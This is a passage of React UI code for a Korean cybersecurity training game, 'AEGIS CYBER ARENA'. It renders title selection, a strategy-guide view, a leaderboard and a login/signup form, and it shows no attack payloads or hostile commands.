                <p style={{ margin: '4px 0 0', fontSize: '13px', color: '#94a3b8' }}>레벨 업 및 전술 마스터리 달성을 통해 획득한 칭호를 선택하여 프로필에 장착할 수 있습니다.</p>
              </div>

              {/* Level Titles */}
              <div className="cyber-card-main" style={{ padding: '24px' }}>
                <h3 style={{ margin: '0 0 16px 0', color: '#facc15', fontSize: '17px' }}>🎖️ 개발자 레벨 랭크 칭호 (Lv.1 ~ Lv.100)</h3>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: '14px' }}>
                  {levelTitleItems.map(item => {
                    const isSelected = selectedTitleId === item.id;
                    return (
                      <div
                        key={item.id}
                        onClick={() => item.unlocked && setSelectedTitleId(item.id)}
                        style={{
                          padding: '16px',
                          background: item.unlocked ? `${item.color}15` : 'rgba(15,23,42,0.5)',
                          border: `1px solid ${item.unlocked ? item.color : 'rgba(255,255,255,0.1)'}`,
                          boxShadow: isSelected ? `0 0 20px ${item.color}` : 'none',
                          cursor: item.unlocked ? 'pointer' : 'not-allowed',
                          opacity: item.unlocked ? 1 : 0.45
                        }}
                      >
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                          <RankEmblem type={item.iconType} color={item.meta.color} size={32} isRainbow={item.meta.isRainbow} />
                          <span style={{ fontSize: '11px', color: item.meta.color, fontWeight: 'bold' }}>{item.range}</span>
                        </div>
                        <div style={{ color: item.unlocked ? '#fff' : '#64748b', fontWeight: 'bold', fontSize: '14px' }}>{item.name}</div>
                        <div style={{ fontSize: '11px', color: item.unlocked ? (isSelected ? '#00f2fe' : '#94a3b8') : '#64748b', marginTop: '4px' }}>
                          {item.unlocked ? (isSelected ? '● 장착 중' : '장착 가능') : '잠김'}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Tactical Mastery Titles */}
              <div className="cyber-card-main" style={{ padding: '24px' }}>
                <h3 style={{ margin: '0 0 16px 0', color: '#00f2fe', fontSize: '17px' }}>⚔️ 8대 전술 마스터리 티어 칭호 (T1 ~ T5)</h3>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(210px, 1fr))', gap: '14px' }}>
                  {masteryTitleItems.map(item => {
                    const isSelected = selectedTitleId === item.id;
                    return (
                      <div
                        key={item.id}
                        onClick={() => item.unlocked && setSelectedTitleId(item.id)}
                        style={{
                          padding: '16px',
                          background: item.unlocked ? `${item.color}15` : 'rgba(15,23,42,0.5)',
                          border: `1px solid ${item.unlocked ? item.color : 'rgba(255,255,255,0.1)'}`,
                          boxShadow: isSelected ? `0 0 20px ${item.color}` : 'none',
                          cursor: item.unlocked ? 'pointer' : 'not-allowed',
                          opacity: item.unlocked ? 1 : 0.45
                        }}
                      >
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                          <span style={{ fontSize: '24px' }}>{item.icon}</span>
                          <span style={{ fontSize: '11px', color: item.color, border: `1px solid ${item.color}`, padding: '2px 6px', fontWeight: 'bold' }}>T{item.tier}</span>
                        </div>
                        <div style={{ color: item.unlocked ? '#fff' : '#64748b', fontWeight: 'bold', fontSize: '14px' }}>{item.categoryName}</div>
                        <div style={{ fontSize: '11px', color: item.unlocked ? (isSelected ? '#00f2fe' : '#94a3b8') : '#64748b', marginTop: '4px' }}>
                          {item.unlocked ? (isSelected ? '● 장착 중' : '장착 가능') : `T${item.tier} 필요`}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: STRATEGY MANUAL (공략집)
             ========================================== */}
          {currentView === 'guide' && (
            <div style={{ width: '90%', maxWidth: '1300px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
              <div>
                <div style={{ fontSize: '12px', color: '#a855f7', fontWeight: 'bold' }}>TACTICAL PLAYBOOK</div>
                <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>📚 8대 카테고리 마스터 공략집</h2>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 300px', gap: '25px', alignItems: 'start' }}>
                {/* Left: Guide Content */}
                <div className="cyber-card-main" style={{ padding: '30px', borderLeft: '4px solid #00f2fe' }}>
                  <h3 style={{ margin: '0 0 20px 0', fontSize: '22px', color: '#fff' }}>
                    {comprehensiveStrategies[activeGuideTab]?.title}
                  </h3>

                  <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', marginBottom: '30px' }}>
                    {comprehensiveStrategies[activeGuideTab]?.steps.map((s, i) => (
                      <div key={i} style={{ background: '#020610', padding: '16px', borderLeft: '3px solid #a855f7' }}>
                        <p style={{ margin: 0, fontSize: '13px', color: '#cbd5e1', lineHeight: '1.8' }}>{s}</p>
                      </div>
                    ))}
                  </div>

                  <div>
                    <h4 style={{ color: '#00f2fe', margin: '0 0 10px 0', fontSize: '14px' }}>💻 대표 공격/방어 페이로드 구조</h4>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      {comprehensiveStrategies[activeGuideTab]?.codeExamples.map((code, idx) => (
                        <div key={idx} style={{ background: '#000', padding: '12px', fontFamily: 'monospace', fontSize: '13px', color: '#f43f5e', border: '1px solid rgba(244, 63, 94, 0.25)' }}>
                          {code}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Right: Guide Selector */}
                <div className="cyber-card-main" style={{ padding: '15px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <div style={{ fontSize: '11px', color: '#64748b', fontWeight: 'bold', padding: '4px 8px' }}>SELECT SECTOR</div>
                  {categories.map(cat => (
                    <div
                      key={cat.id}
                      onClick={() => setActiveGuideTab(cat.id)}
                      style={{
                        padding: '12px',
                        cursor: 'pointer',
                        background: activeGuideTab === cat.id ? 'rgba(168,85,247,0.15)' : '#02050c',
                        border: activeGuideTab === cat.id ? '1px solid #a855f7' : '1px solid rgba(255,255,255,0.05)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'space-between'
                      }}
                    >
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <span>{cat.icon}</span>
                        <span style={{ fontSize: '13px', fontWeight: 'bold', color: activeGuideTab === cat.id ? '#fff' : '#94a3b8' }}>{cat.name}</span>
                      </div>
                      <ArrowRight size={14} color={activeGuideTab === cat.id ? '#a855f7' : '#475569'} />
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: GLOBAL RANKINGS
             ========================================== */}
          {currentView === 'rankings' && (
            <div style={{ width: '85%', maxWidth: '950px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
              <div>
                <div style={{ fontSize: '12px', color: '#facc15', fontWeight: 'bold' }}>GLOBAL LEADERBOARD</div>
                <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>🏆 화이트해커 전역 실시간 랭킹</h2>
              </div>

              {/* 내 랭킹 요약 카드 */}
              {(() => {
                const myEntry = rankingsList.find((r) => r.username === username);
                return (
                  <div className="cyber-card-main" style={{ padding: '20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderColor: 'rgba(0,242,254,0.5)' }}>
                    <div>
                      <div style={{ fontSize: '11px', color: '#64748b', fontWeight: 'bold' }}>내 랭킹 불러오는 중...</div>
                      <div style={{ fontSize: '20px', color: '#00f2fe', fontWeight: 900, marginTop: '4px' }}>
                        {rankingsLoading ? '⏳ 확인 중...' : myEntry ? `전체 ${rankingsList.length}명 중 ${myEntry.rank}위` : authToken ? '아직 랭킹에 집계되지 않았어요' : '게스트는 랭킹에 집계되지 않아요'}
                      </div>
                    </div>
                    <div style={{ textAlign: 'right' }}>
                      <span style={{ padding: '4px 10px', fontSize: '12px', fontWeight: 900, ...getLevelTierBadgeStyle(userLevelTier) }}>LV.{userLevel} · {userLevelTier}</span>
                      <div style={{ color: '#facc15', fontSize: '13px', marginTop: '6px', fontWeight: 'bold' }}>{formatExp(totalExp)} XP</div>
                    </div>
                  </div>
                );
              })()}

              <div className="cyber-card-main" style={{ padding: 0, overflow: 'hidden' }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
                  <thead>
                    <tr style={{ background: 'rgba(0,242,254,0.06)', borderBottom: '1px solid rgba(0,242,254,0.3)' }}>
                      <th style={{ padding: '14px 20px', color: '#00f2fe', width: '15%' }}>순위</th>
                      <th style={{ padding: '14px 20px', color: '#00f2fe' }}>에이전트명</th>
                      <th style={{ padding: '14px 20px', color: '#00f2fe', width: '25%' }}>레벨 등급</th>
                      <th style={{ padding: '14px 20px', color: '#00f2fe', width: '20%' }}>누적 EXP</th>
                    </tr>
                  </thead>
                  <tbody>
                    {rankingsLoading && (
                      <tr><td colSpan={4} style={{ padding: '20px', textAlign: 'center', color: '#94a3b8' }}>⏳ 랭킹 정보를 불러오는 중...</td></tr>
                    )}
                    {!rankingsLoading && rankingsList.length === 0 && (
                      <tr><td colSpan={4} style={{ padding: '20px', textAlign: 'center', color: '#94a3b8' }}>아직 등록된 랭킹이 없습니다. 첫 번째 기록의 주인공이 되어 보세요!</td></tr>
                    )}
                    {rankingsList.map((r) => {
                      const { level } = getLevelInfo(r.points);
                      const tier = getDeveloperLevelTier(level);
                      const medal = r.rank === 1 ? '🥇' : r.rank === 2 ? '🥈' : r.rank === 3 ? '🥉' : null;
                      const isMe = r.username === username;
                      return (
                        <tr key={r.username} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)', background: isMe ? 'rgba(0,242,254,0.05)' : (r.rank === 1 ? 'rgba(250,204,21,0.03)' : 'transparent') }}>
                          <td style={{ padding: '16px 20px', fontWeight: 'bold', color: r.rank === 1 ? '#facc15' : '#cbd5e1' }}>{medal ? `${medal} ` : ''}{r.rank}위</td>
                          <td style={{ padding: '16px 20px', fontWeight: 'bold', color: isMe ? '#00f2fe' : '#fff' }}>{r.username}{isMe ? ' (나)' : ''}</td>
                          <td style={{ padding: '16px 20px' }}><span style={{ padding: '2px 8px', ...getLevelTierBadgeStyle(tier) }}>LV.{level} · {tier}</span></td>
                          <td style={{ padding: '16px 20px', color: isMe ? '#00f2fe' : '#cbd5e1', fontWeight: 'bold' }}>{formatExp(r.points)} XP</td>
                        </tr>
                      );
                    })}
                    {!rankingsLoading && !rankingsList.some((r) => r.username === username) && (
                      <tr style={{ background: 'rgba(0,242,254,0.03)' }}>
                        <td style={{ padding: '16px 20px', color: '#00f2fe', fontWeight: 'bold' }}>✨ MY</td>
                        <td style={{ padding: '16px 20px', fontWeight: 'bold', color: '#00f2fe' }}>{username} (나){!authToken ? ' · 게스트(비공개)' : ''}</td>
                        <td style={{ padding: '16px 20px' }}>
                          <span style={{ padding: '3px 8px', ...getLevelTierBadgeStyle(userLevelTier) }}>LV.{userLevel} · {userLevelTier}</span>
                        </td>
                        <td style={{ padding: '16px 20px', color: '#00f2fe', fontWeight: 'bold' }}>{formatExp(totalExp)} XP</td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: LOGIN / SIGNUP
             ========================================== */}
          {currentView === 'login' && (
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', flex: 1, padding: '40px' }}>
              <div className="cyber-card-main" style={{ width: '420px', padding: '40px', background: 'rgba(10,15,30,0.95)', borderColor: '#00f2fe', boxShadow: '0 0 30px rgba(0,242,254,0.2)' }}>
                <div style={{ fontSize: '12px', color: '#00f2fe', letterSpacing: '3px', fontWeight: 'bold', marginBottom: '8px', textAlign: 'center' }}>
                  {loginMode === 'login' ? 'USER LOGIN' : 'NEW AGENT REGISTRATION'}
                </div>
                <h2 className="neon-forge-cyan" style={{ fontSize: '24px', margin: '0 0 25px 0', textAlign: 'center', fontWeight: '900' }}>
                  AEGIS<span className="neon-hack-text">CYBER</span>ARENA
                </h2>

                {authError && (
                  <div style={{ marginBottom: '16px', padding: '10px 12px', border: '1px solid #f87171', color: '#f87171', fontSize: '12px', borderRadius: '4px', background: 'rgba(248,113,113,0.08)' }}>
                    ⚠ {authError}
                  </div>
                )}

                <div style={{ marginBottom: '16px' }}>
                  <label style={{ display: 'block', fontSize: '12px', color: '#cbd5e1', fontWeight: 'bold', marginBottom: '6px' }}>
                    <i className="fa-solid fa-user" style={{ color: '#00f2fe', marginRight: '4px' }}></i> 아이디
                  </label>
                  <input
                    type="text"
                    value={loginId}
                    onChange={(e) => setLoginId(e.target.value)}
                    placeholder="에이전트 이름 (예: player1)"
                    style={{ width: '100%', padding: '12px', border: '1px solid rgba(0, 242, 254, 0.3)', backgroundColor: '#010307', color: '#fff', outline: 'none', borderRadius: '4px', fontSize: '14px' }}
                  />
                </div>
                <div style={{ marginBottom: '25px' }}>
                  <label style={{ display: 'block', fontSize: '12px', color: '#cbd5e1', fontWeight: 'bold', marginBottom: '6px' }}>
                    <i className="fa-solid fa-lock" style={{ color: '#00f2fe', marginRight: '4px' }}></i> 비밀번호
                  </label>
                  <input
                    type="password"
                    value={loginPw}
                    onChange={(e) => setLoginPw(e.target.value)}
                    placeholder="비밀번호를 입력하세요"
                    style={{ width: '100%', padding: '12px', border: '1px solid rgba(0, 242, 254, 0.3)', backgroundColor: '#010307', color: '#fff', outline: 'none', borderRadius: '4px', fontSize: '14px' }}
                  />
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  <button
                    disabled={authLoading}
                    onClick={async () => {
                      const targetUser = loginId.trim();
                      const targetPw = loginPw;
                      if (!targetUser || !targetPw) {
                        setAuthError('아이디와 비밀번호를 모두 입력해주세요.');
                        return;
                      }
                      setAuthError('');
                      setAuthLoading(true);
                      try {
                        const { token, user } = loginMode === 'login'
                          ? await authApi.login(targetUser, targetPw)
                          : await authApi.register(targetUser, targetPw);
                        try { localStorage.setItem('aegis_token', token); } catch {}
                        setAuthToken(token);
                        setUsername(user.username);
                        setTotalExp(user.points);
                        setSolvedProblemIds(user.solvedIds);
                        setTacticalMastery((prev) => ({ ...prev, ...user.tacticalMastery }));
                        setIsLoggedIn(true);
                        setCurrentView('landing');
                      } catch (err) {
                        setAuthError(err instanceof Error ? err.message : 'DB 서버에 연결할 수 없습니다. Neon 연결 설정을 확인하세요.');
                      } finally {
                        setAuthLoading(false);
                      }
                    }}
                    className="cyber-btn-cyan"
                    style={{ padding: '14px', fontSize: '15px', fontWeight: 'bold', cursor: authLoading ? 'wait' : 'pointer', borderRadius: '4px', opacity: authLoading ? 0.6 : 1 }}
                  >
                    {authLoading ? '⏳ 처리 중...' : loginMode === 'login' ? '🔑 로그인' : '🆕 계정 생성 후 로그인'}
                  </button>
                  <button
                    onClick={() => { setAuthError(''); setLoginMode(loginMode === 'login' ? 'register' : 'login'); }}
                    style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: '12px', cursor: 'pointer', textDecoration: 'underline' }}
                  >
                    {loginMode === 'login' ? '계정이 없으신가요? 새 에이전트 등록' : '이미 계정이 있으신가요? 로그인으로 전환'}
                  </button>
                  <button
                    onClick={() => {
                      try { localStorage.removeItem('aegis_token'); } catch {}
                      setAuthToken(null);
                      setUsername('GuestOperator');
                      try { localStorage.setItem('aegis_username', 'GuestOperator'); } catch {}
                      setIsLoggedIn(true);
                      setCurrentView('landing');
                    }}
                    className="cyber-btn-purple"
                    style={{ padding: '12px', fontSize: '13px', cursor: 'pointer', borderRadius: '4px' }}
                  >
                    👤 게스트로 로그인 (이 기기에만 저장)
                  </button>
                </div>
              </div>
            </div>
          )}

        </div>
      </div>
    </div>
  );
}
